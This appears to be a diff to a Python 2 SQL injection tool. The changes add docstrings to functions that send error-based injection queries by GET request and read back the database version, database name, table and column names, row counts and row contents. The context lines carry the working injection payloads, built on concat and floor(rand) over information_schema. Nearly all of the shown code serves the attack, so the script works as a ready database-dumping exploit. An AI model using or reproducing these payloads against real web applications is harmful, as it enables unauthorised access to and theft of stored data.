@@ -50,6 +50,11 @@ def validate_vulnerable(url):
 		print "URL is not vulnerable"
 		return None
 
+'''
+splitascii(hexVal) takes the webpage result as input in the form of String and parses it to 
+return hex value of the decoded message from sql server.
+'''
+
 def splitascii(hexVal):
 	if "'~1'" in hexVal:
 		tempHex = hexVal.split("'~1'")[0].split("'~'")[1]
@@ -58,6 +63,11 @@ def splitascii(hexVal):
 		return tempHex
 	return '00'
 
+'''
+getVersion(url) takes the absolute path of url as input and sends a sql query as a GET request 
+to the server which returns the SQL Database version in hex format.
+'''
+
 def getVersion(url):
 	exploitQuery = " and(select 1 from(select count(*),concat((select (select " \
 				"concat(0x7e,0x27,Hex(cast(version() " \
@@ -65,6 +75,11 @@ def getVersion(url):
 				" limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1"
 	res = requests.get(url + exploitQuery).text
 	print "Version is: " + splitascii(res).decode('hex')
+
+'''
+getDatabase(url) takes the absolute path of url as input and sends a sql query as a GET request 
+to the server which returns the master Database name in hex format.
+'''
 
 def getDatabase(url):
 	exploitQuery = " and(select 1 from(select count(*),concat((select " \
@@ -77,6 +92,11 @@ def getDatabase(url):
 	exploit_dict['dbName'] = exploitVal
  	print "Database Name: " + exploitVal
 
+'''
+gettablescount(url) takes the absolute path of url as input and sends a sql query as a GET request 
+to the server which returns the total number of tables present in the database.
+'''
+
 def gettablescount(url):
 	tempVal = exploit_dict.get('dbNameAscii')
 	exploitQuery = " and(select 1 from(select count(*),concat((select (select (SELECT concat(0x7e,0x27,count(table_name)," \
@@ -87,6 +107,11 @@ def gettablescount(url):
 	exploitVal = splitascii(res)
 	exploit_dict['tableCount'] = int(exploitVal)
 	print "Number of Tables in the Database:" +  str(exploitVal)
+
+'''
+gettablenames(url) takes the absolute path of url as input and sends a sql query as a GET request 
+to the server which returns all the table names present in the database.
+'''
 
 def gettablenames(url):
 	tempCount = exploit_dict.get('tableCount')
@@ -103,6 +128,11 @@ def gettablenames(url):
 		exploit_dict['tableNameAscii'].append(str(splitascii(res)))
 		exploitVal = splitascii(res).decode('hex')
 		exploit_dict['tableNames'].append(exploitVal)
+
+'''
+getcolumncount(url,tname) takes the absolute path of url, table name as input and sends a sql query as a GET request 
+to the server which returns total number of columns present on table "tname".
+'''
 
 def getcolumncount(url,tname):
 	tempDBName = exploit_dict.get('dbNameAscii')
@@ -121,6 +151,11 @@ def getcolumncount(url,tname):
 	temp['count'] = int(exploitVal)
 	exploit_tables[tname] = temp
 
+'''
+getcolumnnames(url,tname) takes the absolute path of url, table name as input and sends a sql query as a GET request 
+to the server which returns column names present on table "tname".
+'''
+
 def getcolumnnames(url,tname):
 	tempDBNameHex = exploit_dict.get('dbNameAscii')
 	tempTableNamesHex = exploit_dict.get('tableNameAscii')
@@ -138,6 +173,11 @@ def getcolumnnames(url,tname):
 		tempArr.append(exploitVal.decode('hex'))
 		exploit_columnNames[tname] = tempArr
 
+'''
+getrowcount(url,tname) takes the absolute path of url, table name as input and sends a sql query as a GET request 
+to the server which returns total number of rows present on table "tname".
+'''
+
 def getrowcount(url,tname):
 	tempDBName = exploit_dict.get('dbName')
 	tempTableNamesHex = exploit_dict.get('tableNameAscii')
@@ -151,6 +191,10 @@ def getrowcount(url,tname):
 	tempObj["recCount"] = int(exploitVal)
 	exploit_recordsCount[tname] = tempObj
 
+'''
+getrows(url,tname,cname,n) takes the absolute path of url, table name, column name, range as input and sends a sql query as a GET request 
+to the server which returns specified number of 'n' row data present in column name 'cname' on table "tname".
+'''
 
 def getrows(url,tname,cname,n):
 	tempDBName = exploit_dict.get('dbName')
